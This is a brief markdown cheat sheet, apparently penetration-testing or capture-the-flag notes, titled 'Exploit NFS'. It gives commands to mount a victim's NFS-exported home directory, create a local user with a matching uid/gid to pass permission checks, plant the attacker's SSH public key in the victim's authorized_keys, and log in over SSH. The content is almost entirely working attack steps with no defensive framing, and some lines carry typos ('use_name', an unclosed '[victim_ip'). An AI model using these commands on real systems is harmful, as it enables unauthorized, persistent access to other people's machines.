### Exploit NFS

```
mkdir /mnt/user_name
mount [victim_ip]:/home/user_name /mnt/user_name
````
#### sometimes we need create user with specific uid/gid
```
groupadd -g 1005 user_name
adduser user_name -uid 1001 -gi 1005
su user_name
```
#### ssh keygen
```
ssh-keygen
mkdir /mnt/user_name/.ssh
touch /mnt/user_name/.ssh/authorized_keys
cat ~/.ssh/id_rsa.pub > /mnt/user_name/.ssh/authorized_keys
ssh use_name@[victim_ip
```


